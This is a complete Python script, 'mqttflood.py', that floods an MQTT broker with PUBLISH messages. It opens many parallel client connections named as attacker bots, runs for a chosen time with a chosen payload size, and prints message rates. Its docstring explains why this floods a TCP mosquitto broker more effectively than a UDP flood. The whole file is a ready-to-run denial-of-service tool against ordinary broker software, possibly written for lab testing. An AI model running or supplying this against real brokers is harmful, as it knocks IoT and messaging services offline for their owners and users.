#!/usr/bin/env python3
"""
MQTT publish flood — opens many real TCP+MQTT client connections to the
broker and hammers it with PUBLISH packets. Unlike a UDP flood (which the
TCP-only broker silently drops), every message in this attack is parsed,
authenticated against the ACL, logged, and forwarded by mosquitto.

The attacker can choose:
  - duration (seconds)
  - parallel connections (clients)
  - message size (bytes per PUBLISH)
  - topic pattern

Usage: python mqttflood.py <broker_ip> <duration_secs> [clients] [size]
"""
import sys, time, threading
import paho.mqtt.client as mqtt

broker   = sys.argv[1]
duration = int(sys.argv[2])
clients  = int(sys.argv[3]) if len(sys.argv) > 3 else 50
size     = int(sys.argv[4]) if len(sys.argv) > 4 else 1024

payload = ("X" * size).encode()
count = {"sent": 0, "err": 0, "conn": 0}
lock = threading.Lock()


def worker(wid):
    try:
        c = mqtt.Client(client_id=f"attacker_bot_{wid}")
        c.connect(broker, 1883, 60)
        c.loop_start()
        with lock:
            count["conn"] += 1
    except Exception:
        with lock:
            count["err"] += 1
        return
    end = time.time() + duration
    while time.time() < end:
        try:
            c.publish(f"attack/flood/{wid}", payload, qos=0)
            with lock:
                count["sent"] += 1
        except Exception:
            with lock:
                count["err"] += 1
    try:
        c.loop_stop()
        c.disconnect()
    except Exception:
        pass


print(f"[mqttflood] broker={broker}:1883  clients={clients}  "
      f"payload={size}B  duration={duration}s — beginning storm", flush=True)
threads = []
for i in range(clients):
    t = threading.Thread(target=worker, args=(i,), daemon=True)
    t.start()
    threads.append(t)

start = time.time()
while time.time() - start < duration:
    time.sleep(3)
    elapsed = int(time.time() - start)
    with lock:
        s, e, k = count["sent"], count["err"], count["conn"]
    rate = s / max(1, elapsed)
    print(f"[mqttflood] t={elapsed:02d}s  conns={k}/{clients}  "
          f"PUBLISH sent={s}  err={e}  rate={rate:.0f} msg/s", flush=True)

for t in threads:
    t.join(timeout=2)

with lock:
    s, e, k = count["sent"], count["err"], count["conn"]
total_bytes = s * size
print(f"[mqttflood] FINISHED — {s} PUBLISH messages over {k} clients, "
      f"{e} errors, ~{total_bytes/1e6:.1f} MB of MQTT payload "
      f"delivered to broker in {duration}s", flush=True)
